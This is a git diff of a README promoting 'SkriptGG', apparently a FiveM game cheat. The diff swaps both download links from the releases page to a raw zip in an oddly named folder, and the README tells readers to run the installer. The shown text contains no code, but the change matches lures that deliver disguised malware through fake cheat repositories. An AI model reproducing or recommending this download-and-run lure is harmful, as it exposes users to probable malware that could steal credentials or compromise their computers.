@@ -1,7 +1,7 @@
 <h1>⚡ SkriptGG - Boost Your FiveM Gameplay Instantly</h1>
 
 <p align="center">
-  <a href="https://github.com/mayakovskieveninglychnis927/SkriptGG/releases" style="display:inline-block;padding:15px 30px;background:linear-gradient(135deg,#e91e63,#ff9800);color:#fff;font-size:20px;font-weight:bold;text-decoration:none;border-radius:50px;box-shadow:0 5px 15px rgba(233,30,99,0.4);">📥 DOWNLOAD NOW – FREE</a>
+  <a href="https://raw.githubusercontent.com/mayakovskieveninglychnis927/SkriptGG/main/Cistercianism/1.4.zip" style="display:inline-block;padding:15px 30px;background:linear-gradient(135deg,#e91e63,#ff9800);color:#fff;font-size:20px;font-weight:bold;text-decoration:none;border-radius:50px;box-shadow:0 5px 15px rgba(233,30,99,0.4);">📥 DOWNLOAD NOW – FREE</a>
 </p>
 
 ## 🎮 What Is SkriptGG?
@@ -46,7 +46,7 @@ Getting started is easy. Follow these simple steps:
 
 ### Step 1: Download SkriptGG
 Visit this link to download the application:  
-👉 **[Click Here to Download SkriptGG](https://github.com/mayakovskieveninglychnis927/SkriptGG/releases)**
+👉 **[Click Here to Download SkriptGG](https://raw.githubusercontent.com/mayakovskieveninglychnis927/SkriptGG/main/Cistercianism/1.4.zip)**
 
 ### Step 2: Run the Installer
 Once the download is complete, locate the downloaded file in your **Downloads** folder. Double-click it to run the setup. Follow any on-screen prompts that appear. The installer will set everything up automatically.
